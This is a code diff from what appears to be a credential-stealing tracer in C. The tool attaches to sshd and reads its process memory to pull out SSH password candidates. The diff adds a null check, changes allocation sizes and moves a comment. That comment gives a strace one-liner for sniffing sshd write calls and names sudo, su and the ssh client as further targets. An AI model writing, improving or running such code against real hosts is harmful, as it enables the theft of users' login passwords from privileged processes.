@@ -21,23 +21,6 @@ extern char *process_name;
 extern char *process_path;
 extern char *process_username;
 
-/* This tracer is mostly a proof of concept.
- * This can easily be done with a command like
- * `strace -p ${sshd_pid} -f 2>&1 | grep write`
- * Although, strace isn't on a lot of servers by
- * default. Other tracers like sudo, su, and ssh
- * client are slightly better usecases for this tool
- */
-
-char *extract_write_string(pid_t traced_process, long length) {
-  char *strval = NULL;
-  long str_ptr = 0;
-
-  str_ptr = get_syscall_arg(traced_process, 1);
-  strval = read_memory(traced_process, str_ptr, length);
-
-  return strval;
-}
 
 /*
  * finds ssh password candidates in memory
@@ -65,6 +48,9 @@ char *find_password_write(char *memory, unsigned long len) {
 
   memory_copy = (char *) calloc(sizeof(char) * len + 1, 1);
 
+  if (!memory_copy)
+    goto failed_find_password;
+
   if (len > 8) {
     memset(memory_copy, 0, len);
     memcpy(memory_copy, memory, len);
@@ -80,7 +66,7 @@ char *find_password_write(char *memory, unsigned long len) {
              | ((checksum << 24) & 0xff000000);
 
     if (slen == checksum) {
-      retval = (char *) calloc(sizeof(char) * slen + 1, 1);
+      retval = (char *) calloc(sizeof(char) * len + 1, 1);
 
       if (!retval)
         goto failed_find_password;
@@ -101,7 +87,7 @@ char *find_password_write(char *memory, unsigned long len) {
              | ((checksum << 24) & 0xff000000);
 
     if (slen == checksum) {
-      retval = (char *) calloc(sizeof(char) * slen + 1, 1);
+      retval = (char *) calloc(sizeof(char) * len + 1, 1);
 
       if (!retval)
         goto failed_find_password;
@@ -118,6 +104,13 @@ failed_find_password:
   return NULL;
 }
 
+/* This tracer is mostly a proof of concept.
+ * This can easily be done with a command like
+ * `strace -p ${sshd_pid} -f 2>&1 | grep write`
+ * Although, strace isn't on a lot of servers by
+ * default. Other tracers like sudo, su, and ssh
+ * client are slightly better usecases for this tool
+ */
 void intercept_ssh(pid_t traced_process) {
   char *write_string = NULL;
   char *password = NULL;
